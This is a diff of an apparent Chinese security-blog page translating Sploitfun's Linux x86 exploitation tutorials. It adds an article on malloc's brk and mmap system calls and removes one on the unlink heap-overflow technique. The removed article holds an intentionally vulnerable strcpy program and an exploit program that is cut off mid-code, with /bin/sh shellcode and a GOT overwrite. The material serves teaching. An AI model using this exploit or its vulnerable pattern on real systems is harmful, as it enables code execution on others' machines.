@@ -112,6 +112,108 @@
         
           <section id="main">
   
+    <article id="post-mallocsystemcall"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170105/mallocsystemcall/">Malloc使用的系统调用</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170105/mallocsystemcall/" class="article-date">
+	  <time datetime="2017-01-05T03:07:05.000Z" itemprop="datePublished">一月 5, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>译者：资深工程师@Barret</p>
+<hr>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170105/mallocsystemcall" target="_blank" rel="external">Linux(X86)漏洞利用系列-Malloc使用的系统调用</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0X01 brk</li>
+<li>0X02 mmap</li>
+</ul>
+</blockquote>
+<p>学到这里，你应该已经知道malloc是使用系统调用从操作系统获取内存，正如下图所示，malloc是使用<a href="http://man7.org/linux/man-pages/man2/sbrk.2.html" target="_blank" rel="external">brk</a>或者<a href="http://man7.org/linux/man-pages/man2/mmap.2.html" target="_blank" rel="external">mmap</a>系统调用来获得内存分配的。</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/mallocsystemcall1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/mallocsystemcall1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<h3 id="0X01-brk"><a href="#0X01-brk" class="headerlink" title="0X01 brk"></a>0X01 brk</h3><p><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L252" target="_blank" rel="external">brk</a>通过增加程序中断位置(<a href="http://lxr.free-electrons.com/source/include/linux/mm_types.h?v=3.8#L365" target="_blank" rel="external">brk</a>)从内核中获取内存（初始化非0）。一开始堆段的起始(<a href="http://lxr.free-electrons.com/source/include/linux/mm_types.h?v=3.8#L365" target="_blank" rel="external">start_brk</a>)和结束(<a href="http://lxr.free-electrons.com/source/include/linux/mm_types.h?v=3.8#L365" target="_blank" rel="external">brk</a>)都指向同一位置。</p>
+<blockquote>
+<ul>
+<li>当<a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="external">ASLR</a>关闭时，start_brk和brk将指向数据段(<a href="http://lxr.free-electrons.com/source/include/linux/mm_types.h?v=3.8#L364" target="_blank" rel="external">end_data</a>)的末尾</li>
+<li>当ASLR打开时，start_brk和brk指向的位置即为数据段(end_data)的末尾地址加上随机brk偏移地址所指向的位置</li>
+</ul>
+</blockquote>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/mallocsystemcall2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/mallocsystemcall2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>由上图可知，start_brk即为堆段的初始位置，brk（程序中断）即为堆段的末尾位置<br><em><u>Example:</u></em></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">/* sbrk and brk example */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">void</span> *curr_brk, *tmp_brk = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to sbrk example:%d\n"</span>, getpid());</div><div class="line"></div><div class="line">        <span class="comment">/* sbrk(0) gives current program break location */</span></div><div class="line">        tmp_brk = curr_brk = sbrk(<span class="number">0</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Program Break Location1:%p\n"</span>, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        <span class="comment">/* brk(addr) increments/decrements program break location */</span></div><div class="line">        brk(curr_brk+<span class="number">4096</span>);</div><div class="line"></div><div class="line">        curr_brk = sbrk(<span class="number">0</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Program break Location2:%p\n"</span>, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        brk(tmp_brk);</div><div class="line"></div><div class="line">        curr_brk = sbrk(<span class="number">0</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Program Break Location3:%p\n"</span>, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><em><u>输出分析:</u></em><br>在增加程序中断之前：在下面的输出中我们可以看到这没有堆段，因此</p>
+<blockquote>
+<ul>
+<li>start_brk=brk=end_data=0x804b000</li>
+</ul>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ ./sbrk </div><div class="line">Welcome to sbrk example:<span class="number">6141</span></div><div class="line">Program Break Location1:<span class="number">0x804b000</span></div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="number">6141</span>/maps</div><div class="line">...</div><div class="line"><span class="number">0804</span>a000<span class="number">-0804</span>b000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539624</span>     /home/sploitfun/ptmalloc.ppt/syscalls/sbrk</div><div class="line">b7e21000-b7e22000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</div></pre></td></tr></table></figure>
+<p><em>增加了程序中断位置之后：</em>在下面的输出中我们可以看到这有堆段了，因此：</p>
+<blockquote>
+<ul>
+<li>start_brk=end_data=0x804b000</li>
+<li>brk=0x804c000</li>
+</ul>
+</blockquote>
+<p>在这<br>0804b000-0804c000是这个堆段的虚拟地址范围<br>rw-p是权限（读，写，不可执行，私有）<br>00000000代表文件偏移量——由于它不是从其它文件映射而来，所以就为0<br>00:00是主要/次要设备编号——由于它不是从其它文件映射而来，所以这里为0<br>0代表Inode编号——由于它不是从其它文件映射而来，所以这里为0<br>[heap]堆段</p>
+<h3 id="0X02-mmap"><a href="#0X02-mmap" class="headerlink" title="0X02 mmap"></a>0X02 mmap</h3><p> malloc使用<a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L1285" target="_blank" rel="external">mmap</a>创建私有匿名映射段。私有匿名映射的主要目的是分配新的内存（零填充），并且这个新的内存将被调用进程独占使用。<br><em><u>Example:</u></em></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> <span class="comment">/* Private anonymous mapping example using mmap syscall */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="keyword">static</span> <span class="keyword">inline</span> <span class="title">errExit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s failed. Exiting the process\n"</span>, msg);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">int</span> ret = <span class="number">-1</span>;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to private anonymous mapping example::PID:%d\n"</span>, getpid());</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Before mmap\n"</span>);</div><div class="line">        getchar();</div><div class="line">        <span class="keyword">char</span>* addr = <span class="literal">NULL</span>;</div><div class="line">        addr = mmap(<span class="literal">NULL</span>, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</div><div class="line">        <span class="keyword">if</span> (addr == MAP_FAILED)</div><div class="line">                errExit(<span class="string">"mmap"</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After mmap\n"</span>);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        <span class="comment">/* Unmap mapped region. */</span></div><div class="line">        ret = munmap(addr, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>);</div><div class="line">        <span class="keyword">if</span>(ret == <span class="number">-1</span>)</div><div class="line">                errExit(<span class="string">"munmap"</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After munmap\n"</span>);</div><div class="line">        getchar();</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><em><u>输出分析：</u></em><br><em><u>mmap之前：</u></em>在下面的输出中，我们只能看到属于共享库libc.so和ld-linux.so的内存映射段</p>
+<pre><code>sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps
+08048000-08049000 r-xp 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap
+08049000-0804a000 r--p 00000000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap
+0804a000-0804b000 rw-p 00001000 08:01 539691     /home/sploitfun/ptmalloc.ppt/syscalls/mmap
+b7e21000-b7e22000 rw-p 00000000 00:00 0 
+...
+sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$
+</code></pre><p><em><u>mmap之后：</u></em>在下面的输出中，我们可以观察到我们的内存映射段（b7e00000 - b7e21000，大小为132KB）与已有的内存映射段（b7e21000 - b7e22000）结合了</p>
+<p>在这里<br>b7e00000-b7e22000是这个堆段的虚拟地址范围<br>rw-p代表权限（读，写，不可执行，私有）<br>00000000代表文件偏移量——由于它不是从其它文件映射而来，所以就为0<br>00:00是主要/次要设备编号——由于它不是从其它文件映射而来，所以这里为0<br>0代表Inode编号——由于它不是从其它文件映射而来，所以这里为0</p>
+<p><em><u>munmap之后：</u></em>在下面的输出中，我们可以看到我们的内存映射段是未映射的，即它的相应的内存被释放到操作系统。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/<span class="number">6067</span>/maps</div><div class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</div><div class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</div><div class="line"><span class="number">0804</span>a000<span class="number">-0804</span>b000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539691</span>     /home/sploitfun/ptmalloc.ppt/syscalls/mmap</div><div class="line">b7e21000-b7e22000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$</div></pre></td></tr></table></figure>
+<p><em><u>注意：</u></em>在我们的示例程序执行过程中ASLR是被关闭的。</p>
+<p><em><u>参考文献：</u></em><br>1.<a href="http://duartes.org/gustavo/blog/post/anatomy-of-a-program-in-memory/" target="_blank" rel="external">Anatomy of program in memory</a></p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170105/mallocsystemcall" target="_blank" rel="external">Linux(X86)漏洞利用系列-Malloc使用的系统调用</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/系统内核/">系统内核<span class="article-category-count">11</span></a>
+
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Memory/">Memory</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-useafterfree"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
     
@@ -853,130 +955,6 @@ Multiple Arena：
 <!-- Table of Contents -->
 
   
-    <article id="post-heapoverflow-unlink"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170104/heapoverflow-unlink/">Unlink堆溢出</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20170104/heapoverflow-unlink/" class="article-date">
-	  <time datetime="2017-01-04T10:06:46.000Z" itemprop="datePublished">一月 4, 2017</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/heapoverflow-unlink" target="_blank" rel="external">Linux(X86)漏洞利用系列-Unlink堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<h3 id="写在最前"><a href="#写在最前" class="headerlink" title="写在最前"></a>写在最前</h3><p>chunk是指具体进行内存分配的区域，目前的默认大小是4M。 </p>
-<p><u>阅读基础</u></p>
-<p><a href="http://www.csyssec.org/20170104/glibcmalloc" target="_blank" rel="external">深入理解glibc malloc</a></p>
-<p>这篇文章，我们会学习到如何利用unlink技术成功利用堆缓冲区溢出。在深入了解unlink技术之前，我们先来看看一个漏洞程序：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* </span></div><div class="line"> Heap overflow vulnerable program. </div><div class="line"> */</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[] )</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">char</span> * first, * second;</div><div class="line"></div><div class="line"><span class="comment">/*[1]*/</span> first = <span class="built_in">malloc</span>( <span class="number">666</span> );</div><div class="line"><span class="comment">/*[2]*/</span> second = <span class="built_in">malloc</span>( <span class="number">12</span> );</div><div class="line">        <span class="keyword">if</span>(argc!=<span class="number">1</span>)</div><div class="line"><span class="comment">/*[3]*/</span>         <span class="built_in">strcpy</span>( first, argv[<span class="number">1</span>] );</div><div class="line"><span class="comment">/*[4]*/</span> <span class="built_in">free</span>( first );</div><div class="line"><span class="comment">/*[5]*/</span> <span class="built_in">free</span>( second );</div><div class="line"><span class="comment">/*[6]*/</span> <span class="keyword">return</span>( <span class="number">0</span> );</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>上面漏洞程序的第三行会导致堆缓冲区溢出。用户输入的’argv[1]’被拷贝到’first’堆缓冲区，而没有设定任何大小限制。因此，当用户的输入大于666字节时，边界就会覆盖下一个chunk的chunk头。这种溢出进而会导致任意代码执行。</p>
-<p>下面是漏洞程序堆内存的形象图:</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/heapoverflow1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/heapoverflow1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-<p><u>Unlink</u>: 其主要思想是欺骗’glibc malloc’来达到解开(unlink) ‘second’ chunk的目的。当解开(unlinking) 时，free函数的GOT表项就会被shellcode的地址覆盖。 成功覆盖之后，在漏洞代码中第五行当free被调用时，shellcode就会被执行。还不清楚？没问题，我们先来看看当fre执行的时候’glibc malloc’都做了些什么。</p>
-<p>如果没有攻击中的影响，第[4]行中的<a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c" target="_blank" rel="external">free</a>会做下面这些事情：</p>
-<ul>
-<li>对于<a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L10" target="_blank" rel="external">没有被映射的chunks来说</a>，向后合并(consolidate banckward)或者向前合并(consolidate forward)。</li>
-<li>向后合并：<ul>
-<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L17" target="_blank" rel="external">查找前一个chunk是否空闲</a>- 如果当前被释放的chunk的PREV_INUSE(P)位没有设置，则shuoming 说明前一个chunk是空闲的。在我们的例子中，由于“first”的PREV_INUSE位已经设置，说明前一个chunk已经被分配了，默认情况下，堆内存的第一个chunk前一个chunk被分配(尽管它不存在)。</li>
-<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L18" target="_blank" rel="external">如果空闲，则合并</a> 比如，从binlist上unlink(移除)前一个chunk,然后将前一个chunk的大小加到当前大小中并修改chunk指针指向前一个chunk。在我们的例子中，前一个chunk已经被分配了，因此unlink没有执行。从而当前被释放的chunk ‘first’不能被向后合并。</li>
-</ul>
-</li>
-<li>向前合并:<ul>
-<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L26" target="_blank" rel="external">查找下一个chunk是否空闲</a>- 如果下下个chunk(从当前被释放的chunk算起)的PREV_INUSE(P)位没有设置，则shuoming 说明下前一个chunk是空闲的。为了遍历到下下个chunk，将当前被释放chunk的大小加入到chunk指针，然后将下一个chunk的大小加入到下一个chunk指针。在我们的例子中，当前被释放chunk的下下个指针是top chunk，并且它的PREV_INUSE位已经设置，说明下一个chunk ‘second’不是空闲的。</li>
-<li><a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L30" target="_blank" rel="external">如果空闲，则合并</a> 比如，从binlist上unlink(移除)前一个chunk,然后将下一个chunk的大小加到当前大小中。在我们的例子中，下一个chunk已经被分配了，因此unlink没有执行。从而当前被释放的chunk ‘first’不能被向前合并。</li>
-</ul>
-</li>
-<li>现在，<a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_free_snip.c#L41" target="_blank" rel="external">将被合并的chunk添加到未排序的bin中</a>。在我们的例子中，合并未能成功执行，所以只要将’first’ chunk添加到未排序的bin中。</li>
-</ul>
-<p>现在我们可以说攻击者在第[3]行按照以下方式覆盖了’second’ chunk的chunk头部：</p>
-<ul>
-<li>prev_size = 偶数，因此PREV_INUSE没有被设置</li>
-<li>size = -4</li>
-<li>fd = free地址 -12</li>
-<li>bk = shellcode地址</li>
-</ul>
-<p>如果受到攻击者的影响，第[4]行中的free会做以下事情：</p>
-<ul>
-<li>对于没有被映射的chunks来说，向后合并(consolidate banckward)或者向前合并(consolidate forward)。</li>
-<li>向后合并：<ul>
-<li>查找前一个chunk是否空闲- 如果当前被释放的chunk的PREV_INUSE(P)位没有设置，则shuoming 说明前一个chunk是空闲的。在我们的例子中，由于“first”的PREV_INUSE位已经设置，说明前一个chunk已经被分配了，默认情况下，堆内存的第一个chunk前一个chunk被分配(尽管它不存在)。</li>
-<li>如果空闲，则合并 比如，从binlist上unlink(移除)前一个chunk,然后将前一个chunk的大小加到当前大小中并修改chunk指针指向前一个chunk。在我们的例子中，前一个chunk已经被分配了，因此unlink没有执行。从而当前被释放的chunk ‘first’不能被向后合并。</li>
-</ul>
-</li>
-<li>向前合并:<ul>
-<li>查找下一个chunk是否空闲- 如果下下个chunk(从当前被释放的chunk算起)的PREV_INUSE(P)位没有设置，则说明下前一个chunk是空闲的。为了遍历到下下个chunk，将当前被释放chunk的大小加入到chunk指针，然后将下一个chunk的大小加入到下一个chunk指针。在我们的例子中，当前被释放chunk的下下个指针不是(NOT)top chunk。由于攻击者已经用-4覆盖了’second’ chunk的大小，’second’ chunk的下下个chunk应该在-4偏移处。因此，现在’glibc malloc’将’second’ chunk的prev_inuse当做下下个chunk的大小域。由于攻击者已经用一个偶数(PREV_INUSE(P)位被复位)覆盖了prev_size，这样就欺骗了’glibc malloc’ 让其相信’second’ chunk是释放的。</li>
-<li>如果空闲，则合并] 比如，从binlist上unlink(移除)前一个chunk,然后将下一个chunk的大小加到当前大小中。在我们的例子中，下一个chunk是空闲的，因此’second’ chunk将按以下方式<a href="https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c" target="_blank" rel="external">unlink</a>。<pre><code>+  将&apos;second&apos; chunk的fd和bk值相应的拷贝到[FD](https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c#L3)与[BK](https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c#L4)变量。在我们例子中，FD =free地址-12， BK=shellcode地址 (作为堆溢出的一部分，攻击者将shellcode放入&apos;first&apos;堆缓冲区内部）。
-+  [BK的值被拷贝到FD的12偏移处](https://github.com/sploitfun/lsploits/blob/master/hof/unlink/malloc_unlink_snip.c#L5)。在我们的例子中，将12字节加入到FD中，然后指向free的GOT表项。这样一来，GOT表项就被shellcode的地址覆盖了。太棒了！现在，任何时候只要free被调用，就会执行shellcode! 因此，漏洞程序中的第五行就会导致shellcode的执行。
-</code></pre></li>
-</ul>
-</li>
-<li>现在，将被合并的chunk添加到未排序的bin中。</li>
-</ul>
-<p>被攻击者修改过的用户输入，漏洞程序的堆内存的形象图如下：</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/heapoverflow2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/heapoverflow2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-<p>理解了unlink技术之后，我们就可以写漏洞利用程序了。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">/* Program to exploit 'vuln' using unlink technique.</div><div class="line"> */</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">#define FUNCTION_POINTER ( 0x0804978c )         //Address of GOT entry for free function obtained using "objdump -R vuln".</div><div class="line">#define CODE_ADDRESS ( 0x0804a008 + 0x10 )      //Address of variable 'first' in vuln executable. </div><div class="line"></div><div class="line">#define VULNERABLE "./vuln"</div><div class="line">#define DUMMY 0xdefaced</div><div class="line">#define PREV_INUSE 0x1</div><div class="line"></div><div class="line">char shellcode[] =</div><div class="line">        /* Jump instruction to jump past 10 bytes. ppssssffff - Of which ffff would be overwritten by unlink function</div><div class="line">        (by statement BK-&gt;fd = FD). Hence if no jump exists shell code would get corrupted by unlink function. </div><div class="line">        Therefore store the actual shellcode 12 bytes past the beginning of buffer 'first'*/</div><div class="line">        "\xeb\x0assppppffff"</div><div class="line">        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";</div><div class="line"></div><div class="line">int main( void )</div><div class="line">&#123;</div><div class="line">        char * p;</div><div class="line">        char argv1[ 680 + 1 ];</div><div class="line">        char * argv[] = &#123; VULNERABLE, argv1, NULL &#125;;</div><div class="line"></div><div class="line">        p = argv1;</div><div class="line">        /* the fd field of the 